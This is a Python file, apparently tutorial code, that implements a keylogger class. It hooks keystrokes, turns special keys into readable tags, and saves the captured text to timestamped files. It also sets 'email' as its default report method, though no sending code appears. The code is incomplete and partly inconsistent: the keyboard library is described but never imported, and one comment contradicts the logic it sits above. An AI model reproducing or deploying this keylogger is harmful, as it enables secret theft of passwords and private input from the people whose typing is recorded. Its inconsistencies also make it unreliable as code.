
""" This module allows you to take complete control of your keyboard,
 hook global events, register hotkeys, simulate key presses,
 and much more."""

# importing keyboard module
from datetime import datetime # for getting the current time

# initializing the variables
SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on


# creating the keylogger
class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    # defining callback for the keyboard events
    def callback(self, event):
        # name of the key
        name = event.name
        # if length of key is one, then using uppercase
        if len(name) > 1 :
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # adding a new line whenever an enter is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replacing spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    """
    The update_filename() method is simple; we take the recorded datetimes
     and convert them to a readable string. After that, we construct a filename
      based on these dates, which we'll use for naming our logging files.
    
    The report_to_file() method creates a new file with the name 
    of self.filename, and saves the key logs there.
    """
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:19].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:19].replace(" ", "-").replace(":", "")
        self.filename = f"keylogger_{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")